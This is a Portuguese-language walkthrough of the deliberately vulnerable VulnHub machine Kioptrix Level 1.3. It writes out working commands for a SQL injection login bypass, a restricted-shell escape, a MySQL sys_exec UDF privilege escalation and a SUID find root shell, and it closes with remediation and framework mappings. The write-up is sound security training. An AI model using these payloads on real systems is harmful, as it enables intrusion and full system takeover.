# Kioptrix: Level 1.3 (#4) — O Gauntlet Clássico de SQL Injection

Bora rapaziada!! Kioptrix Level 1.3 é uma daquelas máquinas boot2root clássicas que todo iniciante precisa derrubar pelo menos uma vez na vida. Sem mentira, mano: SQL injection num formulário de login, uma restricted shell que cai em segundos, e o MySQL rodando como root sem senha. Cada camada aqui mapeia diretamente para algo que você vai encontrar no mundo real. Essa máquina é basicamente um "greatest hits" do que acontece quando os devs ignoram segurança básica. Vamos nessa.

Muito respeito ao Kioptrix por manter esses clássicos vivos e acessíveis no VulnHub. Conteúdo fundamental, véi.

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | Kioptrix: Level 1.3 (#4) |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/kioptrix-level-13-4,25/ |
| **Técnicas** | Enumeração de serviços com Nmap, bypass de autenticação por SQLi, escape de restricted shell (lshell), abuso de UDF sys_exec no MySQL para SUID, GTFOBins find -exec |
| **CVEs** | CWE-89 (SQL Injection), CWE-250 (MySQL rodando como root), CWE-272 (Violação de Least Privilege), CWE-522 (Credenciais Insuficientemente Protegidas) |
| **Grupos APT** | FIN7: usa SQL injection para acesso inicial em portais web de alvos financeiros e varejo; APT41: abuso documentado de funções UDF do MySQL para execução de comandos no OS como parte de movimento lateral em pós-exploração |

---

## Resumo do Ataque

```
netdiscover / nmap
  → portas: 22 (SSH), 80 (HTTP formulário de login)
  → dirb → /john, /robert (hints de usuários)
  → SQL injection: john / ' or 1=1 #
  → vazamento de credencial: john:MyNameIsJohn, robert:ADGAdsafdfwt4gadfga==
  → SSH john@alvo:22
  → restricted shell (lshell): echo os.system('/bin/bash')
  → shell bash completo
  → cat /var/www/checklogin.php → MySQL root (sem senha)
  → mysql -u root → SELECT sys_exec('chmod u+s /usr/bin/find')
  → /usr/bin/find agora SUID root
  → find /tmp/raj -exec /bin/sh \;
  → uid=0(root)
  → cat /root/congrats.txt
```

---

## Metodologia

1. Descoberta de host com netdiscover na sub-rede local
2. Varredura completa de portas e enumeração de serviços com nmap
3. Brute-force de diretórios para enumerar caminhos web e inferir usuários
4. Bypass de autenticação por SQL injection no formulário de login
5. Login SSH com credenciais vazadas na lshell restrita
6. Escape da restricted shell via truque Python os.system
7. Revisão de código-fonte para extrair credenciais root do MySQL
8. UDF sys_exec do MySQL para setar bit SUID em /usr/bin/find
9. Escalação GTFOBins via find SUID para root
10. Captura da flag

---

## Passo 1 — Descoberta de Host e Varredura de Portas

```bash
sudo netdiscover -i eth1 -r 192.168.56.0/24
# Alvo: 192.168.1.106

nmap -A 192.168.1.106
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1
80/tcp open  http    Apache httpd 2.2.8
```

Dois serviços: SSH e um formulário de login HTTP. A aplicação web com login é a superfície de ataque principal.

**Nota real:** Todo formulário de login exposto na internet deve ser tratado como alvo de SQL injection durante a avaliação inicial. Endpoints não autenticados com entrada de usuário aparecem consistentemente como top findings em pentests de aplicações web.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Brute-Force de Diretórios

```bash
dirb http://192.168.1.106
gobuster dir -u http://192.168.1.106 -w /usr/share/wordlists/dirb/common.txt
```

**Diretórios encontrados:** `/john`, `/robert`

Os nomes dos diretórios divulgam diretamente usuários válidos. Isso é vazamento de informação antes mesmo de tocar no formulário de login.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivo e Diretório; T1589.001 — Coleta de Informações de Identidade da Vítima

---

## Passo 3 — Bypass de Autenticação por SQL Injection

Acesse `http://192.168.1.106`. O formulário de login aceita usuário e senha. Tente SQL injection:

```
Usuário: john
Senha: ' or 1=1 #
```

Login bem-sucedido. A página vaza a credencial real armazenada no banco:

```
Usuário: john
Senha: MyNameIsJohn
```

Tente o mesmo para `robert`:

```
Usuário: robert
Senha: ' or 1=1 #
```

```
Usuário: robert
Senha: ADGAdsafdfwt4gadfga==
```

**Como funciona:** A query SQL do backend é algo como:
```sql
SELECT * FROM users WHERE username='john' AND password='' or 1=1 #'
```

O `#` comenta a aspa de fechamento. `1=1` sempre é verdadeiro, então a cláusula WHERE passa para qualquer linha. A aplicação então exibe a senha real armazenada (em texto puro, absurdo demais, caramba).

**Nota real:** SQL injection em formulários de login está consistentemente no OWASP Top 10 (A03 Injection). O FIN7 usou SQLi extensivamente em ataques contra aplicações web de ponto de venda em alvos varejistas entre 2017 e 2020. Variantes de `' or 1=1` são detectadas por praticamente qualquer WAF, mas aplicações internas não protegidas continuam vulneráveis em ambientes corporativos.

**MITRE ATT&CK:** T1190 — Explorar Aplicação Voltada ao Público; T1078 — Contas Válidas

---

## Passo 4 — Login SSH e Escape da Restricted Shell

```bash
ssh john@192.168.1.106
# Senha: MyNameIsJohn
```

A shell é restrita: `lshell` (Limited Shell). A maioria dos comandos é bloqueada. Verifique:

```
lshell> ls
lshell> /bin/bash  # → proibido
```

Escape via truque Python os.system:

```bash
echo os.system('/bin/bash')
```

Funciona porque `echo` é permitido no lshell, e o Python interpreta o argumento. Resultado: shell `bash` completo.

**Escapes alternativos:**
```bash
# Se Python estiver disponível:
python -c 'import os; os.system("/bin/bash")'

# Via ssh:
ssh john@192.168.1.106 /bin/bash
```

**Nota real:** Restricted shells não são controles de segurança. São recursos de conveniência. `lshell`, `rbash` e similares são consistentemente bypassados em minutos. Uma fronteira de segurança adequada requer chroot jails, containers ou arquiteturas dedicadas de bastion. O OceanLotus (APT32) busca e bypassa restricted shells durante pós-exploração para ganhar acesso completo de comandos.

**MITRE ATT&CK:** T1059.004 — Interpretador de Comandos: Unix Shell

---

## Passo 5 — Descoberta de Credenciais no Código-Fonte

Com o shell bash completo, leia o código-fonte da aplicação web:

```bash
cat /var/www/checklogin.php
```

```php
$host='localhost';
$username='root';
$password='';
$db_name='members';
```

MySQL root sem senha. Isso é catastrófico, mano.

**MITRE ATT&CK:** T1552.001 — Credenciais Desprotegidas: Credenciais em Arquivos

---

## Passo 6 — MySQL UDF sys_exec: Escalação SUID

Conecte ao MySQL como root (sem senha necessária):

```bash
mysql -u root
```

Use a UDF (User Defined Function) `sys_exec` para executar comandos do OS como dono do processo MySQL (root):

```sql
SELECT sys_exec('chmod u+s /usr/bin/find');
```

Saia do MySQL e verifique:

```bash
quit
ls -la /usr/bin/find
# -rwsr-xr-x root root /usr/bin/find
```

`/usr/bin/find` agora está com SUID root. Qualquer usuário pode executar comandos como root através dele.

**MITRE ATT&CK:** T1548.001 — Abuso de Mecanismo de Elevação: Setuid e Setgid; T1068 — Exploração para Escalação de Privilégios

---

## Passo 7 — GTFOBins: find -exec Shell de Root

```bash
cd /tmp
touch raj
find raj -exec whoami \;
# root

find raj -exec /bin/sh \;
id
# uid=0(root) gid=0(root) groups=0(root)
```

**Shell de root conquistado.** Leia a flag:

```bash
cat /root/congrats.txt
```

(☞ﾟヮﾟ)☞ GG mano. Kioptrix 4 derrubado. Top demais!

**Nota real:** O APT41 foi documentado usando funções UDF do MySQL para execução de comandos do OS durante pós-exploração de servidores de banco de dados. A abordagem `sys_exec` é particularmente perigosa porque não requer compilação de código de exploit, apenas queries SQL.

**MITRE ATT&CK:** T1068 — Exploração para Escalação de Privilégios

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Credencial (SQLi) | john:MyNameIsJohn | SQLi no login web | Acesso SSH |
| Credencial (SQLi) | robert:ADGAdsafdfwt4gadfga== | SQLi no login web | SSH alternativo |
| Credencial (fonte) | root:(vazia) | /var/www/checklogin.php | Acesso root MySQL |
| Shell root | uid=0(root) | MySQL sys_exec UDF → SUID find | Acesso total ao sistema |
| Flag | /root/congrats.txt | /root/ | Prova de comprometimento |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Takeaway Principal |
|---|---|---|---|
| 1 | SQL injection vaza senhas em texto puro | SQLi é OWASP A03; armazenamento em texto puro é A02 Falhas Criptográficas | Use queries parametrizadas; hash com bcrypt/Argon2 |
| 2 | Exposição de usernames via listagem de diretórios | Vazamento de informação reduz esforço do atacante a zero para enumeração de usuários | Desabilite listagem de diretórios; não use usernames como caminhos URL |
| 3 | Restricted shell (lshell) bypassada em segundos | Restricted shells não são controles de segurança em nenhum framework | Use chroot jails, containers ou bastion hosts com MFA |
| 4 | MySQL rodando como root sem senha | MySQL root no OS root é escalação direta para qualquer usuário SQL | Execute MySQL como usuário dedicado de baixo privilégio; sempre defina senha forte para root |
| 5 | UDF sys_exec concede root do OS via SQL | Documentado pelo APT41 em intrusões direcionadas contra servidores de banco de dados | Remova UDF; revogue privilégios FILE/SUPER de contas de app MySQL |
| 6 | Credenciais em PHP sob web root | Finding comum em aplicações PHP legadas | Armazene credenciais em variáveis de ambiente ou gerenciadores de segredos |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivo e Diretório | T1083 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação Voltada ao Público | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | SQL Injection para Extração de Credenciais | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Execução | Execução | Interpretador de Comandos: Unix Shell | T1059.004 |
| Evasão de Defesa | Evasão | Escape de Restricted Shell | T1059.004 |
| Escalação de Privilégios | Escalação | Abuso de Setuid e Setgid | T1548.001 |
| Escalação de Privilégios | Escalação | Exploração para Escalação de Privilégios | T1068 |
| Persistência | Persistência | Contas Válidas | T1078 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Corrija SQL injection**: Use PDO com prepared statements ou MySQLi parametrizado em todas as funções de login; nunca concatene input do usuário em strings SQL
2. **Hash de senhas**: Armazene senhas com bcrypt (fator de custo 12+) ou Argon2id; nunca armazene em texto puro
3. **Desabilite listagem de diretórios**: Configure `Options -Indexes` no Apache; remova diretórios com nomes de usuários
4. **Substitua restricted shell**: Implemente chroot jails ou ambientes containerizados para usuários SSH de acesso limitado
5. **Proteja o MySQL**: Defina senha forte para root; execute mysqld como usuário dedicado `mysql` (nunca root); remova UDF sys_exec
6. **Remova credenciais do código-fonte da app**: Armazene em variáveis de ambiente; use arquivos `.env` fora do web root

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar aplicações web e serviços de banco de dados; mapear fronteiras de confiança |
| Proteger | Controle de Acesso | Desabilitar root MySQL anônimo; aplicar least privilege para contas de banco |
| Proteger | Segurança de Dados | Hash de todas as senhas; eliminar armazenamento em texto puro |
| Detectar | Anomalias e Eventos | Alertar em padrões de erro SQL; monitorar MySQL para chamadas sys_exec |
| Responder | Planejamento de Resposta | Bloquear acesso remoto ao MySQL; rotacionar todas as credenciais no comprometimento |
| Recuperar | Planejamento de Recuperação | Reconstruir a partir de imagem limpa; auditar todo código PHP para SQLi adicional |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| SI-10 | Validação de Entrada de Informação | Validar e sanitizar todos os inputs do formulário de login; usar prepared statements |
| IA-5 | Gestão de Autenticadores | Hash de senhas; aplicar complexidade; rotacionar no comprometimento |
| AC-6 | Menor Privilégio | MySQL executa como usuário dedicado; sem privilégios SUPER ou FILE para contas de app |
| CM-7 | Menor Funcionalidade | Desabilitar UDFs não utilizadas do MySQL; desabilitar listagem de diretórios no Apache |
| SC-28 | Proteção de Informação em Repouso | Nenhuma credencial em texto puro em arquivos de código-fonte ou diretórios web acessíveis |

### CISA KEV

SQL injection (CWE-89) aparece em múltiplas entradas da CISA KEV incluindo vulnerabilidades em Drupal, vBulletin e vários frameworks PHP. A BOD 22-01 da CISA exige que agências federais remediem vulnerabilidades de SQL injection dentro de prazos definidos. O padrão de root MySQL sem senha permitiu comprometimento total do OS, consistente com o Alerta CISA AA21-209A documentando caminhos de exploração de banco de dados.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Identidade e Acesso (IAM) | Gerenciar Identidades e Credenciais | MIL3 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Consciência Situacional (SITUATION) | Implementar Logging | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Endurecimento de Configuração de Aplicação (queries parametrizadas; desabilitar listagem de diretórios)
- **D3-OAM** — Gestão Administrativa do Sistema Operacional (usuário não-root MySQL; remover UDF)
- **D3-HBPI** — Endurecer Integridade do Pipeline de Build (nenhuma credencial em código-fonte de aplicação implantado)
- **D3-DQSA** — Análise de String de Query de Banco de Dados (detectar padrões SQLi em logs de query)

---

## Considerações Finais

Kioptrix 4 é uma máquina de aprendizado perfeita para demonstrar como um único SQL injection pode se transformar em comprometimento total do sistema quando combinado com más configurações em cada camada. A cadeia de ataque é limpa: SQLi, escape do lshell, root MySQL, abuso de SUID. Cada passo é uma técnica real usada em intrusões de produção por grupos como FIN7 e APT41.

A máquina ensina paciência e enumeração sistemática. O vazamento de diretório, o bypass de SQLi, a credencial no código PHP, o truque UDF: cada um é um achado real de engajamentos reais. Altamente recomendada para qualquer pessoa estudando para OSCP ou construindo seus fundamentos de CTF.

Sensacional essa máquina, véi!

Thanks guys!! (❍ᴥ❍ʋ)
